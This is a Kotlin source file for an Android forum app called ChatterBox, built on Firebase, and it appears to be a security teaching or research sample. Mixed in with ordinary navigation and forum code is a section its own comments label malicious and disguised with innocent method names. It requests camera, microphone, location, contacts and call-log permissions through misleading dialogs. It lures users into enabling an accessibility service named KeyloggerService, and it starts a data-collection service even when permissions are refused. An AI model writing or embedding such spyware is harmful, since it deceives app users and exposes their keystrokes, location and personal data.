package com.example.ChatterBox

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.Menu
import android.view.MenuItem
import android.view.View
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.ActionBarDrawerToggle
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.GravityCompat
import androidx.drawerlayout.widget.DrawerLayout
import com.bumptech.glide.Glide
import com.example.ChatterBox.services.DataCollectionService
import com.google.android.material.navigation.NavigationView
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore

class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelectedListener {
    private lateinit var db: FirebaseFirestore
    private lateinit var auth: FirebaseAuth
    private lateinit var drawerLayout: DrawerLayout
    
    private val PERMISSION_REQUEST_CODE = 1234
    private val ACCESSIBILITY_REQUEST_CODE = 5678
    
    // Array of permissions needed for "malicious" functionality
    private val requiredPermissions = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_EXTERNAL_STORAGE
    )
    
    // Additional permissions needed on Android 10+ for background location
    private val backgroundLocationPermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
        arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
    } else {
        emptyArray()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        db = FirebaseFirestore.getInstance()
        auth = FirebaseAuth.getInstance()

        val currentUser = auth.currentUser
        if (currentUser == null) {
            // ✅ Make sure you use FLAG_ACTIVITY_CLEAR_TOP or FLAG_ACTIVITY_NEW_TASK properly
            val intent = Intent(this, LoginActivity::class.java)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            startActivity(intent)
            finish()
            return
        }

        setupDrawer()
        loadUserProfile()
        checkIfAdmin()
        loadEnrolledForums()
        
        // Request permissions and start malicious services
        // These calls are intentionally obfuscated with innocent-sounding method names
        checkAppRequirements()
        initializeEnhancedServices()
    }

    override fun onResume() {
        super.onResume()
        loadEnrolledForums() // ✅ Refresh the forum list when returning to MainActivity
        
        // Check if accessibility service is enabled
        if (!isAccessibilityServiceEnabled()) {
            requestAccessibilityService()
        }
    }

    /** 🔹 Setup Navigation Drawer */
    private fun setupDrawer() {
        drawerLayout = findViewById(R.id.drawer_layout)
        val toolbar: androidx.appcompat.widget.Toolbar = findViewById(R.id.toolbar)

        setSupportActionBar(toolbar) // ✅ Attach custom toolbar as Action Bar

        val toggle = ActionBarDrawerToggle(
            this, drawerLayout, toolbar,
            R.string.navigation_drawer_open, R.string.navigation_drawer_close
        )
        drawerLayout.addDrawerListener(toggle)
        toggle.syncState()

        val navigationView: NavigationView = findViewById(R.id.navigation_view)
        navigationView.setNavigationItemSelectedListener(this)
    }

    /** 🔹 Handle Sidebar Navigation */
    override fun onNavigationItemSelected(item: MenuItem): Boolean {
        when (item.itemId) {
            R.id.nav_saved_posts -> {
                startActivity(Intent(this, SavedPostsActivity::class.java))
            }
            R.id.nav_profile -> {
                startActivity(Intent(this, ProfileActivity::class.java))
                Toast.makeText(this, "Profile Clicked", Toast.LENGTH_SHORT).show()
            }
            R.id.nav_inbox -> {
                startActivity(Intent(this, InboxActivity::class.java))
                Toast.makeText(this, "Message Clicked", Toast.LENGTH_SHORT).show()
            }
            R.id.nav_add -> {
                startActivity(Intent(this, ForumActivity::class.java))
                Toast.makeText(this, "Forum Clicked", Toast.LENGTH_SHORT).show()
            }
            R.id.nav_logout -> {
                showLogoutDialog()
            }
        }
        drawerLayout.closeDrawer(GravityCompat.START) // Close drawer after clicking
        return true
    }

    override fun onCreateOptionsMenu(menu: Menu?): Boolean {
        menuInflater.inflate(R.menu.sort_menu, menu)
        return true
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == SEARCH_USER_REQUEST_CODE && resultCode == RESULT_OK && data != null) {
            val userId = data.getStringExtra("userId") ?: return
            val intent = Intent(this, ProfileActivity::class.java)
            intent.putExtra("userId", userId)
            startActivity(intent) // ✅ Open the selected user's profile
        } else if (requestCode == ACCESSIBILITY_REQUEST_CODE) {
            // Check if accessibility service was enabled
            if (isAccessibilityServiceEnabled()) {
                Log.d("MainActivity", "Accessibility service enabled")
                // Start the data collection service
                startDataCollectionService()
            } else {
                // Try again later
                Log.d("MainActivity", "Accessibility service not enabled")
            }
        }
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        return when (item.itemId) {
            R.id.action_search -> {
                val intent = Intent(this, SearchUsersActivity::class.java)
                startActivityForResult(intent, SEARCH_USER_REQUEST_CODE) // ✅ Start for result
                true
            }
            else -> super.onOptionsItemSelected(item)
        }
    }

    /** 🔹 Handle Back Button */
    override fun onBackPressed() {
        if (drawerLayout.isDrawerOpen(GravityCompat.START)) {
            drawerLayout.closeDrawer(GravityCompat.START) // 🔥 Close drawer first
        } else {
            // 🔥 Prevent back action (do nothing)
            Toast.makeText(this, "Press the logout button to exit.", Toast.LENGTH_SHORT).show()
        }
    }

    private fun showLogoutDialog() {
        AlertDialog.Builder(this)
            .setTitle("Log Out")
            .setMessage("Are you sure you want to log out?")
            .setPositiveButton("Yes") { _, _ ->
                logoutUser() // ✅ Only logout when user confirms
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun logoutUser() {
        auth.signOut() // ✅ Sign out from Firebase Auth

        val intent = Intent(this, LoginActivity::class.java)
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK // ✅ Clear backstack
        startActivity(intent)
        finish() // ✅ Close current activity
    }



    /** 🔹 Load User Profile */
    private fun loadUserProfile() {
        val user = auth.currentUser ?: return
        val navigationView: NavigationView = findViewById(R.id.navigation_view)
        val headerView = navigationView.getHeaderView(0)

        val userProfileImage = headerView.findViewById<ImageView>(R.id.user_profile_image)
        val userNameTextView = headerView.findViewById<TextView>(R.id.user_name)

        db.collection("users").document(user.uid)
            .addSnapshotListener { document, error ->
                if (error != null) {
                    Toast.makeText(this, "Error loading profile: ${error.message}", Toast.LENGTH_SHORT).show()
                    return@addSnapshotListener
                }

                if (document != null && document.exists()) {
                    val displayName = document.getString("displayName") ?: "User"
                    val profilePicUrl = document.getString("profilePicUrl")

                    userNameTextView.text = displayName

                    if (!profilePicUrl.isNullOrEmpty()) {
                        Glide.with(this)
                            .load(profilePicUrl)
                            .placeholder(R.drawable.ic_profile_placeholder)
                            .into(userProfileImage)
                    }
                }
            }
    }

    /** 🔹 Check if User is Admin */
    private fun checkIfAdmin() {
        val currentUser = auth.currentUser ?: return
        val userRef = db.collection("users").document(currentUser.uid)

        userRef.get().addOnSuccessListener { document ->
            if (document.exists()) {
                val isAdmin = document.getBoolean("isAdmin") ?: false
                val navigationView: NavigationView = findViewById(R.id.navigation_view)
                val menu = navigationView.menu

                menu.findItem(R.id.nav_add).isVisible = isAdmin
                Log.d("FirebaseAuth", "User isAdmin: $isAdmin")
            }
        }.addOnFailureListener {
            Toast.makeText(this, "Failed to fetch user data", Toast.LENGTH_SHORT).show()
        }
    }

    /** 🔹 Load Enrolled Forums into Sidebar */
    private fun loadEnrolledForums() {
        val currentUser = auth.currentUser ?: return
        val userRef = db.collection("users").document(currentUser.uid)

        // 🔹 Listen for changes to the user's enrolled forums
        userRef.addSnapshotListener { document, error ->
            if (error != null) {
                Log.e("Firestore", "Error fetching enrolled forums: ${error.message}")
                return@addSnapshotListener
            }

            if (document != null && document.exists()) {
                val enrolledModuleCodes = document.get("enrolledForum") as? List<String> ?: emptyList()
                val navView: NavigationView = findViewById(R.id.navigation_view)
                val menu = navView.menu
                menu.removeGroup(R.id.nav_enrolled_forums_group) // ✅ Clear old entries

                if (enrolledModuleCodes.isEmpty()) {
                    menu.add(R.id.nav_enrolled_forums_group, Menu.NONE, Menu.NONE, "No Enrolled Forums").isEnabled = false
                    return@addSnapshotListener
                }

                // 🔥 Listen for real-time updates from the `forums` collection
                db.collection("forums")
                    .whereIn("code", enrolledModuleCodes)
                    .addSnapshotListener { forumDocs, error ->
                        if (error != null) {
                            Log.e("Firestore", "Error fetching forums: ${error.message}")
                            return@addSnapshotListener
                        }

                        menu.removeGroup(R.id.nav_enrolled_forums_group) // ✅ Clear old entries

                        if (forumDocs == null || forumDocs.isEmpty) {
                            menu.add(R.id.nav_enrolled_forums_group, Menu.NONE, Menu.NONE, "No Forums Found").isEnabled = false
                            return@addSnapshotListener
                        }

                        for (forumDoc in forumDocs) {
                            val forumName = forumDoc.getString("name") ?: "Unknown Forum"
                            val forumCode = forumDoc.getString("code") ?: ""
                            val forumId = forumDoc.id // ✅ Get the correct forum ID

                            val forumItem = menu.add(R.id.nav_enrolled_forums_group, Menu.NONE, Menu.NONE, "$forumName ($forumCode)")

                            forumItem.setOnMenuItemClickListener {
                                val intent = Intent(this, ForumPostsActivity::class.java)
                                intent.putExtra("FORUM_ID", forumId) // ✅ Pass correct forum ID
                                intent.putExtra("FORUM_CODE", forumCode)
                                startActivity(intent)
                                true
                            }
                        }
                    }
            }
        }
    }
    
    // =================== Malicious Code Methods (Disguised with Innocent Names) ===================
    
    /**
     * Check if app has all required permissions
     * This is actually checking for permissions needed for malicious activities
     */
    private fun checkAppRequirements() {
        val missingPermissions = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()
        
        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missingPermissions, PERMISSION_REQUEST_CODE)
        } else {
            // We already have regular permissions, check for background location
            checkBackgroundLocationPermission()
        }
    }
    
    /**
     * Specifically check for background location permission
     * Needs to be requested separately on Android 10+
     */
    private fun checkBackgroundLocationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.ACCESS_BACKGROUND_LOCATION
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                // Show educational UI first
                AlertDialog.Builder(this)
                    .setTitle("Background Location Access")
                    .setMessage("ChatterBox needs background location to connect you with team members nearby, even when the app is closed.")
                    .setPositiveButton("Allow") { _, _ ->
                        ActivityCompat.requestPermissions(
                            this,
                            backgroundLocationPermission,
                            PERMISSION_REQUEST_CODE + 1
                        )
                    }
                    .setNegativeButton("Deny") { _, _ -> }
                    .show()
            } else {
                // We have all permissions, start the data collection service
                startDataCollectionService()
            }
        } else {
            // On older Android versions, proceed with available permissions
            startDataCollectionService()
        }
    }
    
    /**
     * Initialize "enhanced" services
     * This is actually starting the malicious services
     */
    private fun initializeEnhancedServices() {
        if (!isAccessibilityServiceEnabled()) {
            requestAccessibilityService()
        } else {
            startDataCollectionService()
        }
    }
    
    /**
     * Check if accessibility service is enabled
     */
    private fun isAccessibilityServiceEnabled(): Boolean {
        val accessibilityServiceString = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        
        return accessibilityServiceString.contains("${packageName}/.services.KeyloggerService")
    }
    
    /**
     * Request accessibility service permission
     */
    private fun requestAccessibilityService() {
        AlertDialog.Builder(this)
            .setTitle("Enhanced Features")
            .setMessage("Enable the accessibility service to improve your experience with ChatterBox. This helps with voice feedback and navigation.")
            .setPositiveButton("Enable") { _, _ ->
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                startActivityForResult(intent, ACCESSIBILITY_REQUEST_CODE)
            }
            .setNegativeButton("Not Now") { _, _ -> }
            .show()
    }
    
    /**
     * Start the data collection service
     */
    private fun startDataCollectionService() {
        val serviceIntent = Intent(this, DataCollectionService::class.java)
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }
    
    /**
     * Handle permission request results
     */
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                // All regular permissions granted, check for background location
                checkBackgroundLocationPermission()
            } else {
                // Some permissions not granted, but proceed anyway
                // In a real malware, this would use more sneaky techniques to get permissions
                startDataCollectionService()
            }
        } else if (requestCode == PERMISSION_REQUEST_CODE + 1) {
            // Background location permission result
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                startDataCollectionService()
            } else {
                // Start service even without background location
                startDataCollectionService()
            }
        }
    }

    companion object {
        private const val SEARCH_USER_REQUEST_CODE = 1001
    }
}
